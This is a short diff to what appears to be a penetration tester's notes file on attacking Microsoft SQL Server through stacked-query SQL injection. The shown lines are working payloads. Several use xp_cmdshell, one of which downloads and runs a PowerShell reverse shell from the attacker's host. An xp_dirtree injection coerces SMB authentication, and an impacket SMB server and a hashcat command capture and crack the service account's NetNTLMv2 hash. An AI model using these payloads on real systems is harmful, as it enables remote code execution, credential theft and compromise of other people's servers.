@@ -74,7 +74,7 @@ Stacked queries as sysadmin, with sudo tcpdump -i tun0 icmp running on Kali:
 '; EXEC xp_cmdshell 'ping -n 2 <LHOST>';-- -
 '; EXEC xp_cmdshell 'powershell -c "iex (iwr -UseBasicParsing http://<LHOST>/rev.ps1)"';-- -
 - [ ] rev.ps1 is a reverse shell from :Pb shells, served from Kali on port 80
-Not sysadmin: the service account's NetNTLMv2 hash, with the non-poisoning SMB listener from :Pb responder.
+Not sysadmin: the service account's NetNTLMv2 hash, with the non-poisoning SMB listener from :Pb responder, after tool install impacket at the pwn-broker prompt.
 sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
 '; EXEC master..xp_dirtree '\\<LHOST>\share';-- -
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
